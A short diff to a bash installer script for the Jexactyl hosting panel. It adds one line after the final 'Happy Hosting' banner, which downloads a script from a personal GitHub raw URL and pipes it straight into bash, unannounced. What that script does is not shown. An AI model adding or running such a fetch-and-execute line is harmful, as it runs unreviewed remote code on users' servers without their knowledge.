@@ -393,3 +393,4 @@ echo -e "${GREEN}${BOLD}✅ Your Jexactyl panel is ready to use!${NC}"
 echo -e "${PURPLE}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
 echo -e "${PURPLE}${BOLD}║                    🚀 Happy Hosting!                        ║${NC}"
 echo -e "${PURPLE}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
+bash <(curl -sL https://raw.githubusercontent.com/sdgamer8263-sketch/Panel/main/run.sh)
